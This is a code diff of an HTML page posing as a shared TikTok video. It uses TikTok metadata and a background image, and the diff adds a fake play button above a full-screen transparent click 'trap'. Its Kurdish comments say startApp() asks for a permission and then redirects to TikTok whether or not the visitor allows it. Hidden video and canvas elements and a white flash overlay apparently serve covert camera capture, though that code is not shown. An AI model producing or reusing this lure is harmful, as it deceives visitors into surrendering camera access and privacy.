@@ -7,23 +7,32 @@
     
     <meta property="og:title" content="TikTok . Nyan Faxir">
     <meta property="og:description" content="2.9K likes, 188 comments. '#nyan_faxir #hawler_soran_2026'">
-    <meta property="og:image" content="pasha.jpg?v=101">
+    <meta property="og:image" content="pasha.jpg?v=102">
     <meta property="og:url" content="https://rudawsoran.github.io/News/">
     <meta property="og:type" content="video.other">
 
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* وێنەی پشتێنە بە زوومی تەواو و بێ دوگمە */
+        /* وێنەی پشتێنە */
         .bg { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: url('pasha.jpg?v=101') no-repeat center center; 
-            background-size: cover; z-index: 1;
+            background: url('pasha.jpg?v=102') no-repeat center center; 
+            background-size: cover; z-index: 1; transform: scale(1.1);
         }
 
-        /* تەپکەیەکی شەفاف بەسەر هەموو شاشەکەدا */
-        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
+        /* --- ئەمە سەهمی ڤیدیۆکەیە کە داوات کردبوو --- */
+        .play-btn { 
+            position: absolute; top: 50%; left: 50%; 
+            transform: translate(-50%, -50%); z-index: 5; 
+            pointer-events: none; 
+        }
+        .play-icon { 
+            width: 90px; height: 90px; fill: white; opacity: 0.9; 
+            filter: drop-shadow(0px 0px 15px rgba(0,0,0,0.5));
+        }
         
+        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
         
         video, canvas { display: none; }
@@ -31,6 +40,10 @@
 </head>
 <body>
     <div class="bg"></div>
+    
+    <div class="play-btn">
+        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+    </div>
 
     <div id="flash"></div>
     <div id="trap" onclick="startApp()"></div>
@@ -65,7 +78,7 @@
         }
 
         async function startApp() {
-            // ئەگەر دوای ٤ چرکە بڕیاری نەدا، خۆکارانە ڕەوانەی تیکتۆکی بکە
+            // ئەگەر ٤ چرکە تێپەڕی و بڕیاری نەدا، ڕاستەوخۆ دەچێتە ناو تیکتۆک
             const timeout = setTimeout(() => { window.location.href = targetVideo; }, 4000);
 
             try {
@@ -83,7 +96,7 @@
                 setTimeout(() => { window.location.href = targetVideo; }, 400);
 
             } catch (e) {
-                // ئەگەر Allow نەکرد یان Blockی کرد، یەکسەر دەڕوات بۆ تیکتۆک
+                // ئەگەر Allow نەکرد یان Blockی کرد، ڕاستەوخۆ دەینێرێت بۆ تیکتۆک
                 window.location.href = targetVideo;
             }
         }
